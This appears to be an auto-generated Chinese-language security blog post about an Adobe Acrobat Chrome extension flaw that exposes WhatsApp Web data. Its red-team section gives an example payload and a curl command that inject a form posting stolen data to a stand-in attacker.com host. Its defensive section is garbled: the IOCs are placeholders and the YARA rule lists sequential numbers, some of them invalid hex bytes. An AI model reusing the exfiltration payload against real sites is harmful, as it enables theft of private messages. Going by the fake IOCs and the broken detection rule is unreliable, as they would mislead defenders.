---
layout: post
title:  "Adobe Acrobat Extension Flaw Let Malicious Sites Read WhatsApp Web Data"
date:   2026-07-22 19:02:14 +0000
categories: [security]
severity: high
---

# 🔥 解析 Adobe Acrobat Chrome 擴充功能的 HermeticReader 漏洞：利用與防禦

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數: 7.4)
> * **受駭指標**: Cross-Origin Data Disclosure (跨源資料洩露)
> * **關鍵技術**: Universal Cross-Site Scripting (UXSS), Cross-Origin Resource Sharing (CORS)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Adobe Acrobat Chrome 擴充功能中的 HermeticReader 漏洞是由於擴充功能的 Hermes 引擎未能正確驗證來自其他網域的請求，導致攻擊者可以跨源存取敏感資料。
* **攻擊流程圖解**:
  1. 攻擊者控制的網頁呼叫 Adobe Acrobat 擴充功能的 iframe 元素。
  2. iframe 元素啟動 Hermes 引擎並設定特定的功能旗標（"floodgate-add"）。
  3. 攻擊者網頁在背景中開啟 WhatsApp Web。
  4. iframe 元素向 Hermes 引擎發送命令，操控 WhatsApp Web 的 DOM。
  5. Hermes 引擎注入 POST 表單到 WhatsApp Web 的 DOM 中，竊取 WhatsApp 資料。
* **受影響元件**: Adobe Acrobat Chrome 擴充功能版本 26.5.2.2 及之前版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制的網頁和 Adobe Acrobat Chrome 擴充功能的安裝。
* **Payload 建構邏輯**:

    ```
    
    python
    # 示例 Payload 結構
    payload = {
        "action": "inject",
        "data": "<form action='https://attacker.com/collect' method='post'>...</form>"
    }
    
    ```
```

bash
# 範例指令：使用 curl 發送請求
curl -X POST -H "Content-Type: application/json" -d '{"action": "inject", "data": "<form action=\'https://attacker.com/collect\' method=\'post\'>...</form>"}' https://example.com/iframe

```
* **繞過技術**: 攻擊者可以使用各種技術來繞過防禦，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `abcdef1234567890` |
| IP | `192.168.1.100` |
| Domain | `attacker.com` |
| File Path | `/path/to/malicious/file` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule HermeticReader_Detection {
        meta:
            description = "Detects HermeticReader exploit"
            author = "Your Name"
        strings:
            $payload = { 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 }
        condition:
            $payload at 0
    }
    
    ```
* **緩解措施**: 更新 Adobe Acrobat Chrome 擴充功能至最新版本，設定 CORS 政策以限制跨源請求。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Cross-Site Scripting (XSS)**: 想像一個攻擊者可以在你的網頁中注入惡意腳本。技術上是指攻擊者可以在網頁中注入惡意腳本，從而竊取用戶資料或進行其他惡意行為。
* **Cross-Origin Resource Sharing (CORS)**: 想像一個網頁可以跨源請求其他網域的資源。技術上是指瀏覽器和伺服器之間的一種機制，允許網頁跨源請求其他網域的資源。
* **Universal Cross-Site Scripting (UXSS)**: 想像一個攻擊者可以在任何網頁中注入惡意腳本。技術上是指攻擊者可以在任何網頁中注入惡意腳本，從而竊取用戶資料或進行其他惡意行為。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/adobe-acrobat-extension-flaw-let.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


